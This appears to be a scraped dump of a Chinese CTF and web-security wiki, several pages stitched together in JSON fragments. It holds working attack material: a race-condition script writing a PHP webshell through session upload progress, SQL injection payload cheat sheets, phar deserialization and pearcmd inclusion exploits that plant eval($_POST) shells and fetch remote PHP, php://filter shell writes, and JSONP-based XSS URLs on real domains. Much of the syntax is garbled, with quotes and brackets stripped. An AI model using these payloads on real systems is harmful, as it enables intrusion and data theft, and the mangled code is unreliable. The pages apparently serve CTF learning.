相关知识在php5.4之后php.ini开始有⼏个默认选项 1.session.upload_progress.enabled = on 2.session.upload_progress.cleanup = on 3.session.upload_progress.prefix = “upload_progress_” 4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS” 5.session.use_strict_mode=off 第⼀个表示当浏览器向服务器上传⼀个⽂件时，php将会把此次⽂件上传的详细信息(如上传时间、上传进度等)存储在session当中 第⼆个表示当⽂件上传结束后，php将会⽴即清空对应session⽂件中的内容 第三和第四个prefix+name将表示为session中的键名 第五个表示我们对Cookie中sessionID可控简⽽⾔之，我们可以利⽤session.upload_progress将⽊⻢写⼊session⽂件，然后包含这个session⽂件。不过前提是我们需要创建⼀个session⽂件，并且知道session⽂件的存放位置。因为session.use_strict_mode=off的关系，我们可以⾃定义sessionIDlinux系统中session⽂件⼀般的默认存储位置为 /tmp 或 /var/lib/php/session例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建⽂件：/tmp/sess_flag，即使此时⽤户没有初始化session，php也会⾃动初始化Session。 并产⽣⼀个键值，为prefix+name的值，最后被写⼊sess_⽂件⾥还有⼀个关键点就是session.upload_progress.cleanup默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利⽤条件竞争来pass，写⼀个脚本来完成 import ioimport requestsimport threadingurl = http://a914fd90-ab5f-44ae-a9a7-20fb9b6d991e.challenge.ctf.show/def write(session): data = PHP_SESSION_UPLOAD_PROGRESS: ?php system(tac f*);?mumuzi while True: f = io.BytesIO(ba * 1024 * 10) response = session.post(url,cookies=PHPSESSID: flag, data=data, files=file: (muzi.txt, f))def read(session): while True: response = session.get(url+?file=/tmp/sess_flag) if mumuzi in response.text: print(response.text) break else: print(retry)if __name__ == __main__: session = requests.session() write = threading.Thread(target=write, args=(session,)) write.daemon = True write.start() read(session)"},{"path":"/wiki/WP/sql注入/杂项知识点.html","content":"分类1. MD5注入 md5($password,true) md5(string,raw) 参数 描述string\t必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 ffifdyop字符串会造成漏洞。md5(ffifdyop,true)=’or’6xxxxxx因此传入ffifdyop之后，数据库查询语句变为：select * from ‘admin’ where password= or ’6xxxxxx ’ ，变成 ‘’ or 6 MD5返回的16进制数时 出现不符合标准格式的十六进制数、不符合预期的长度、包含特殊情况或错误等情况下，会返回二进制数，经浏览器编码情况下，会变成奇怪的字符，经过不断尝试后，发现某些特定字符被mysql解析成万能密码的格式、如129581926211651571912466741651878684928、ffifdyop，但这里不能用数字型，因为限制密码长度了在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 2.with rollupusername=admin//or//1=1//group//by//password//with/**/rollup#password= 加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[password]的限制成功登陆with rollup 是对分组后的结果进行聚合求和，在最后一行生成求和的数据。但是如果当前列是字符串无法求和的话，求和结果就会变成NULL 3.过滤了 information_schema.tables 和information_schema.columns方法一：反引号绕过 information_schema.`tables` 和 information_schema.`columns` 方法二：找平替表+无列名查询 比如ysql.innodb_table_stats (由于mysql版本不同，可利用的表也不一样) select * from users as a join users as b; 会出现a表和b表拼接成一个新表 再对其使用一个select查询进行包裹，由于会出现多个相同的列名，那么他就会报错。就可以利用此特性进行sql注入查询列名。 select * from (select * from users as a join users as b) as c; 当查询完第一个列名时，使用using排除，继续查询下一个列名。 select * from (select * from users as a join users as b using(id)) as c;实操： ?id=0 union select * from (select * from users as a join users as b) as c --+ （会显示出id） ?id=0 union select * from (select * from users as a join users as b using(id)) as c --+ （会显示出username） ?id=0 union select * from (select * from users as a join users as b using(id，username)) as c --+(会显示出第三列，以此类推)"},{"path":"/wiki/WP/文件上传/phar文件上传绕过.html","content":"什么是phar JAR是开发java程序一个应用，包括所有的可执行、可访问的文件都打包进了一个JAR文件里，使得部署过程十分简单。phar是php里类似与JAR的一种打包文件。对于PHP5.3或更高版本。Phar后缀文件是默认开启支持的，可以使用它。 Phar结构 stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。 manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。 content:被压缩文件的内容 signature (可空):签名，放在末尾。 注意：Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化 phar文件上传绕过的本质就是phar反序列化，只不过是需要文件上传点，这个条件是非常苛刻的，要对方存在文件上传，存在文件包含并且支持phar伪协议，存在反序列化漏洞。 直接看题吧 ?phphighlight_file(__FILE__);error_reporting(0);class TestObject public function __destruct() include(flag.php); echo $flag; #大致意思就是我们要反序列化触发__destruct()方法，就会输出flag$filename = $_POST[file];if (isset($filename)) echo md5_file($filename);//post接受一个文件名，如果存在会返回文件的md5值//upload.php 文件上传页面? 我这里不对代码进行过多的讲解了，看注释。 解题步骤：1.生成一个phar文件–2.在mate-data里放置一个包含TestObject()的序列号字符串–3.上传文件–4.md5_file执行phar伪协议，触发反序列化–5.反序列化TestObject()触发__destruck执行echo $flag 生成phar文件 ?phpclass TestObject@unlink(test.phar); //删除之前的test.par文件(如果有)$phar=new Phar(test.phar); //创建一个phar对象，文件名必须以phar为后缀$phar-startBuffering(); //开始写文件$phar-setStub(?php __HALT_COMPILER(); ?); //写入stub$o=new TestObject();$phar-setMetadata($o);//写入meta-data$phar-addFromString(test.txt,test); //添加要压缩的文件$phar-stopBuffering();? 我生成phar的环境使用的是 要在php.ini中修改在这个 然后访问文件，生成phar包，由于有对文件后缀进行白名单过滤，所有修改文件后缀伪jpg 上传文件 包含文件，读取flag"},{"path":"/wiki/WP/sql注入/绕过select,堆叠.html","content":"2019强网杯”随便注”一看就是sql注入首先判断是数字还是字符注入， 输入 1 ，2，反应正常， 输入2-1 ，结果回显2 的内容，排除数字注入 输入1’ 报错，那就是 select * from database ·····id’1’; 然后就是看列数； 1’ order by 2 –+ 回显正常， order by 3–+异常，那就是两列 然后正常的注入 1’ union select 1,2 –+,发现 preg_match(“select|update|delete|drop|insert|where|.i select 等被ban 了通过报错来查看数据库，等信息 2’ and extractvalue(1,concat(0x7e,(version()),0x7e))–+ 然后可以用堆叠注入，来显示其他信息 内容就在 # supersqli 内容就在 1919810931114514怎么得到里面的内容呢？ 方法一 ：使用handlerHANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 方法二：使用预处理语句set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句-1;set @sql = CONCAT(se,lect * from `1919810931114514`;);prepare stmt from @sql;EXECUTE stmt;结果为strstr($inject, set) strstr($inject, prepare) 这里检测到了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可。-1;Set @sql = CONCAT(se,lect * from `1919810931114514`;);Prepare stmt from @sql;EXECUTE stmt; 方法三：使用rename 和 alter我们使用rename和alter这两个命令来更改表名和字段名。因为我们可以访问words里的columns，发现id，也就是说我们输入的1默认是查询words这个表的。因此我们可以把words表改名成words1表，把1919810931114514表改名成words，然后再把1919810931114514里面的flag字段改名成id，然后输入1’ or 1=1#就可以成功得到flag了。 修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);1;alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);然后使用 1 or 1=1"},{"path":"/wiki/Web知识点/SQL注入/SQLMAP.html","content":"常用参数 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-u/font font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--url/font 指定目标url font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-m/font 从文本中获取多个目标扫描 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-r/font 从文件中加载HTTP请求 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--data/font 以POST方式提交数据 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-random-agent/font 随机ua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--user-agent/font 指定ua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--delay/font 设置请求间的延迟 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--timeout/font 指定超时时间 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--dbms/font 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--os/font 指定数据库服务器操作系统 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--tamper/font 指定tamper font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--level/font 指定探测等级 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--risk/font 指定风险等级 **font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--technique/font** ****注入技术 B: Boolean-based blind SQL injection E: Error-based SQL injection U: UNION query SQL injection S: Stacked queries SQL injection T: Time-based blind SQL injection 11.5.2. Tamper 速查 脚本名称 作用 apostrophemask.py 用utf8代替引号 equaltolike.py like 代替等号 space2dash.py 绕过过滤’’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’) greatest.py 绕过过滤’’ ,用GREATEST替换大于号。 space2hash.py 空格替换为#号 随机字符串 以及换行符 apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.py 在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py 空格替换为其它空符号 base64encode.py 用base64编码替换 space2mssqlhash.py 替换空格 modsecurityversioned.py 过滤空格，包含完整的查询版本注释 space2mysqlblank.py 空格替换其它空白符号(mysql) between.py 用between替换大于号() space2mysqldash.py 替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’) multiplespaces.py 围绕SQL关键字添加多个空格 space2plus.py 用+替换空格 bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换为like nonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters space2randomblank.py 代替空格字符(“”)从一个随机的空白字符可选字符的有效集 sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 chardoubleencode.py 双url编码(不处理以编码的) unionalltounion.py 替换UNION ALL SELECT UNION SELECT charencode.py url编码 randomcase.py 随机大小写 unmagicquotes.py 宽字符绕过 GPC addslashes randomcomments.py 用 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font 分割sql关键字 charunicodeencode.py 字符串unicode编码 securesphere.py 追加特制的字符串 versionedmorekeywords.py 注释绕过 space2comment.py Replaces space character font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252); /fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/font with comments font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font"},{"path":"/wiki/Web知识点/SQL注入/SQL注入.html","content":"SQL注入一、MySqL 一 、同站 判断是否有注入点 and 11 页面正常 and 12 页面异常 如果这两个都没有异常，那就试试字符集 ?id1’ 通过order by判断注入的字段数（猜一下） 页面错误与正常的临界点就是字段数 通过union 来测试 让id负数或者and12让网页报错，报错的那几个数字记住，那个数字报错就在哪里查 比如2，3报错，可以 ············union select 1，version(),database()，4 信息收集 数据库版本：version() 数据库名字：database() 数据库用户：user() 操作系统：@@version_compile_os 在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库，相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名 获取相关信息 ? id-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema’ ‘ ? id-1union select 1,group_concat(column_name),3 from information_schema.columns where table_name’ ‘ ? id-1union select 1,group_concat(user),group_concat(password) from ____ information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表ming名 二 、跨库查询 ? id-1union select 1,group_concat(schema_name),3 from information_schema.schemata 三、文件读写函数 load_file 文件读取 into outfile 或into dumpfile 文件写入 ！在注入点操作 四、int 函数判断是否为整数 $sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; echo $sql; $result=mysql_query($sql);else echo ni shi ge jj?;``` 五、参数提交注入 #简要明确参数类型数字，字符，搜索，JsoN等#简要明确请求方法GET, POST,COOKIE，REQUEST，HTTP头等其中sql语句干扰符号: ,,s,),等，具体需看写法 二、其他数据库特点一、access注入 Access数据库 1表名 2列名 3数据 access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库 access三大攻击手法 access注入攻击片段-联合查询法 access注入攻击片段-逐字猜解法 工具类的使用注入（推荐） Access注入攻击方式 union 注入、http header 注入、偏移注入等 二、msSQL注入https://www.cnblogs.com/xishaonian/p/6173644.html 三、postgresql注入https://www.cnblogs.com/KevinGeorge/p/8446874.html 四、Oracle注入https://www.cnblogs.com/peterpan0707007/p/8242119.html 五、mongoDB注入https://www.cnblogs.com/wefeng/p/11503102.html SQLmap不能识别MongoDB这里介绍nosqlattack:https://github.com/youngyangyang04/NoSQLAttack 三、 12种报错注入+万能语句1、通过floor报错,注入语句如下: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下: and 1(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下: and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下: select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下: and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下: and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下: and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下: and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下: and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下: and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下: and linestring (()select * from(select user() )a)b ); 关于POST注入 常用的万能username语句： a ’ or 11 # a “) or 11 # a‘) or 11 # a” or “1””1 ‘ or ‘1’’1 ‘ or (length(database())) 8 (用于输入’ “都没有错误) ‘ or (ascii(substr((select database()) ,1,1))) 115 # (用于输入’ “都没有错误) “) or (“1”)(“1 “) or 11 or if(11, sleep(1), null) # “) or (length(database())) 8 # “) or (ascii(substr((select database()) ,1,1))) 115 or if(11, sleep(1), null) # post型盲注通杀payload： unameadmin%df’or()or%200%23passwdsubmitSubmit. 万能密码 �’or11# 关于UPDATEXML,REFERER,COOKIE的构造 User-Agent:……… or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) # Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) # Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) # updatexml报错注入 爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) 链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)"},{"path":"/wiki/Web知识点/SQL注入/SQLi流程.html","content":"一、思路1、判断注入点在GET参数、POST参数、以及HTTP头部等，包括Cookie、Referer、XFF(X-Forwarded-for)、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。 1）、GET 注入提交数据的方式是 GET，注入点的位置在 GET 参数部分。例如有这样的一个URL：http://xxx.com/news.php?id=1，id是注入点。 2）、POST 注入使用 POST 方式提交数据，注入点位置在 POST 数据部分，通常发生在表单中。 3）、HTTP 头部注入注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中，Cookie 字段中等。 2、判断数据库类型判断网站使用的是哪个数据库，常见数据库如：MySQL、MSSQL(SQLserver)、Oracle、Access、PostgreSQL、BD2等等。 nmap 端口扫描 数据库类型 默认端口号 Oracle 1521 SQL Server 1433 MySQL 3306 PostgreSql 5432 网站类型 数据库类型 asp SQL Server，Access .net SQL Server php Mysql，PostgreSql java Oracle，Mysql 数据库类型 特有的系统表 Oracle SYS.USER_TABLES SQL Server SYSOBJECTS MySQL(MySQL版本在5.0以上) INFORMATION_SCHEMA.TABLES Access MSYSOBJECTS 2、有回显 报错查询 exp: andor exp(~(select * from (select user () ) a) ); updatexml: andor(updatexml(1,concat(0x7e,(select database()),0x7e),1)) extractvalue: extractvalue(1,concat(0x7e,version(),0x7e)) 联合查询 确定列数：union select 1,2,3# 确定回显列：比如查出来 1，2 那就在1，2上进行查询 确定数据库：union select database() ,2,3# 确定表：union select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schemadatabase()# 确定列：union select (group_concat(column_name)),2,3 from information_schema.columns where table_name’ ‘# 确定用户：union select 1,group_concat(user),3 from ‘ ‘# information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表名 基于报错bool盲注and ascii(substr(database(),1,1))115 3、无回显 基于时间bool盲注 数据库：if(ascii(substr(database(),1,1))114,1,sleep(5))# 表if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schemadatabase() LIMIT 0,1),1,1))114,1,sleep(5))#LIMIT 0,1 → 获取第一张表（如 ‘users’） LIMIT 1,1 → 获取第二张表（如 ‘products’） 4、其他 宽字节：’被转义为 %df’ 堆叠：id1’; insert into users values(‘admin’,’password’)#"},{"path":"/wiki/WP/文件包含/pear文件包含.html","content":"pear文件包含条件： 有文件包含点 开启了pear扩展 配置文件中register_argc_argv 设置为On,而默认为Off 例题 ?phperror_reporting(0);$file = $_GET[file];if(isset($file) !preg_match(/input|data|phar|log|filter/i,$file)) include $file;else show_source(__FILE__); if(isset($_GET[info])) phpinfo(); 我们利用pear扩展进行文件包含 1、远程文件下载实现远程文件包含poc:/?file=/usr/local/lib/php/pearcmd.phpcaigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php 它提示下载到这个目录”tmppeardownload1.php”，我们尝试包含它 2、生成配置文件，配置项传入我们恶意的php代码的形式poc：/?file=/usr/local/lib/php/pearcmd.php+-c+/tmp/ctf.php+-d+man_dir=?eval($_POST[1]);?+-s+ 由于hackbar会尝试编码写入的数据会变成这样%3C?eval($_POST[1]);?%3E;，所以我们使用burp修改一下发包 提示写入成功，尝试包含tmpctf.php 3、写配置文件方式poc:/?file=/usr/local/lib/php/pearcmd.phpaaaa+config-create+/var/www/html/?=`$_POST[1]`;?+1.php 由于可能会遇到前面的编码问题，我们还是用burp 然后访问网站根目录的1.php 因为我们写的poc是符号包起来是的命令执行，要注意不是eval,我们直接用curl反弹 除了pearcmd还有peclcmd"},{"path":"/wiki/WP/文件包含/include(   .php).html","content":"include限制文件后缀if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c 可以用？ 来闭合"},{"path":"/wiki/WP/文件包含/php_filter.html","content":"php:访问各个输入输出流（IO streams），在CTF中经常使用的是php:filter和php:input,php:filter用于读取源码。 基本php:input用于执行php代码 php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=- wirte：写入- convert.base64-decode：对写进文件里的内容先进行一次base64解码，再写入- resource：指定写入的文件名- content提交的值是经过base64编码后的一句话木马//?php assert($_POST[x]);?文件创建成功后，直接蚁剑连接即可 string.rot13?php error_reporting(0);highlight_file(__FILE__);//flag in /flag$file = $_GET[file];$content = $_POST[content];file_put_contents($file,?php die();?.$content);? 这道题就是我们常说的绕过死亡代，因为在中间加上了?php die();?，这就会导致会终止php的执行，不会运行$content的值这里我们用另一个过滤器string.rot13rot13也就是凯撒13，ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。payload:GET提交/?file=php://filter/write=string.rot13/resource=3.phpPOST提交content=?cuc nffreg($_CBFG[k]);?poc解释string.rot13是凯撒13编码content提交的值是经过rot13编码后的一句话木马 补充：php:filter允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器格式为：php:filter 过滤器(read)| 过滤器(write) resource 目标文件参数：resource要过滤的列表read读列表，设置过滤器write写列表，设置过滤器 过滤器字符串过滤器string.rot13 string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。 str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。 string.toupper string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtoupper—将字符串转化为大写 string.tolower （自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtolower—将字符串转化为小写 string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。 转换过滤器如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。convert.base64convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为 长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。 convert.quotedconvert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。 convert.iconv.*这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 iconv — 字符串按要求的字符编码来转换 convery.iconv.*的使用有两种方法: convert.iconv..orconvert.iconv.123支持的字符编码有一下几种（详细参考官方手册） UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* 常见过滤器：string.xxx(字符过滤器): string.rot13、string.toupper、string.tolower、string.strip_tagsconvert.xxx (转换过滤器):convert.base64、convert.quoted-printable、convert.iconv等等compression.xxx(压缩过滤):compression.zlib、compression.bzip2、compression.zlib.deflate、compression.bzip2.compress等等mcrypt(加密过滤)：PHP 7.1.0起废弃！ #所以payload（php文件读取使用：convert.xxx (转换过滤器)）第三步：payload为：?filenamephp:filterconvert.iconv.base64*.base64resourceindex.php###发现显示未找到！应该是转换过滤器中的字符编码被禁止了，字符编码字典更换，爆破字符编码。常见字符编码：UCS-4*UCS-4BEUCS-4LE*UCS-4LEUCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*"},{"path":"/wiki/WP/文件包含/协议&&伪协议.html","content":"file:php:input # 执行php代码php:filter # 读取源码zip: #压缩文件 1.什么是协议协议呢？就是双方都能听明白的一个沟通约定语言，比如我们说的这个普通话，那么它就是一种协议啊，有了它，我们天南海台北的人都能说一个同一个语调，那么我们东北的贵州的说话互相的才能听得懂，那么在我们计算机中呢也有很多协议 常见的网络层有 IP协议、ICMP协议、ARP协议、IGMP协议 应用层 http协议、https协议、ftp协议、ssh协议、gopher协议、qq拉起协议 2.协议的格式协议头:内容(多为二进制 3.php中的协议file: 访问本地文件系统，在不写协议名字的情况下，就默认是file协议它是支持这个路径混杂模式，什么叫做混杂模式，我们知道在linux下，路径呢一般分为什么对吧，分为相对路径和绝对路径，假设我们使用include包含网站根目录下的flag.php,实际上是包含varwwwhtmlflag.php,它会由相对路径转换为绝对路径 http: 访问 HTTP(s) 网址，可以获取远程的内容，返回到本地，也可以用包含函数包含远程文件，可以直接读取远程的php文件在本地执行，RCE。注意：包含远程文件需在php.ini中将allow_url_include设置为On。 ftp: 默认21端口，进行文件传输的协议 data: data: #执行php代码 ?urldata:textplain, **data:**base64 ?urldata:textplain;base64, 数据（RFC 2397）data: 同样类似与php:input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:流会被当作php文件执行。从而导致任意代码执行。 phar: — PHP 归档 glob: — 查找匹配的文件路径模式 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 zlib: — 压缩流 zip: bzip2: zlib: 协议： 条件：allow_url_fopen:offon allow_url_include :offon 作⽤：zip: bzip2: zlib: 均属于压缩流，可以访问压缩⽂件中的⼦⽂ 件，更重要的是不需要指定后缀名 ⽤法：zip:[压缩⽂件绝对路径]%23[压缩⽂件内的⼦⽂件名] compress.bzip2:file.bz2 compress.zlib:file.gz 其中phar:和zip:类似"},{"path":"/wiki/WP/文件包含/有意思的点.html","content":"先看代码?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? 只过滤了php: 没有考虑大小写，也没有考虑data:按部就班的可以做出来但有一点，代码中的$_GET[‘hello’];好像没啥用，看官方WP 原来可以远程文件包含，构造入下http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E"},{"path":"/wiki/Web知识点/xss/JSONP 绕过.html","content":"Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup 